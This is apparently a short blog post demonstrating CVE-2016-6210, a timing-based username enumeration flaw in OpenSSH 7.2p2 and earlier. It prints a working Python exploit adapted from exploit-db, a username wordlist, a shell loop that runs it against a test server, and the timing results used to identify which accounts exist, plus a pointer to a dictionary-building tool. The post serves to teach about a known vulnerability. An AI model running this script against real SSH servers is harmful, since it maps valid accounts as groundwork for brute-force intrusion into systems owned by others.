The 13th if July a new wild CVE appeared (Yes, Pokemon Go is still a buzz for
the moment).

The [CVE 2016-6210](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6210)
allow a user enumeration on an SSH server by comparing request time between non
existing user and allowed ones.
This vulnerability target  OpenSSHD with a version of 7.2p2 or inferior.

That means with a good dictionary you may know which user are
present on the server with an SSH access.

This post just demonstrate how to exploit this vulnerability with a simple
example.

<!-- PELICAN_END_SUMMARY -->

## OpenSSHD <= 7.2p2 - User Enumeration

A tiny python script is present on
[exploit-db](https://www.exploit-db.com/exploits/40113/). I had to modify it a
bit in order to pass the username in parameter:

    #!/bin/python

    import paramiko
    import time
    import sys
    user = sys.argv[1]
    p='A'*25000
    ssh = paramiko.SSHClient()
    starttime=time.clock()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
             ssh.connect('192.168.4.231', username=user,
             password=p)
    except:
             endtime=time.clock()
    total=endtime-starttime
    print(str(user)+ ": " +str(total))

The script will simply try to connect to `192.168.4.231` with the user passed in
parameter and a password of 25 000 'A' and measure the time of the connection.

We create a simple list of possible user with a non existing user to be able to
compare connection times.

    [maggick@computer_name tmp]$ cat list
    nonExistsingUserForSure
    john
    root
    bob
    user
    alice
    max
    ssh_user

We launch the script against our test server:

    [maggick@computer_name tmp]$ while read l; do ./p.py $l; done < list
    nonExistsingUserForSure: 0.17941999999999997
    john: 0.18687900000000002
    root: 0.18173099999999998
    bob: 0.178726
    user: 0.23088699999999995
    alice: 0.13389600000000002
    max: 0.17069700000000004
    ssh_user: 0.24780699999999997

We can easily see that SSH root login is disallowed, and that the user `user`
and `ssh_user` are allowed to connect to the server using SSH.

As often with brute force, the major issue will be to build the dictionary but
some tools like [CeWL](https://github.com/digininja/CeWL) from digininja can
help build it.
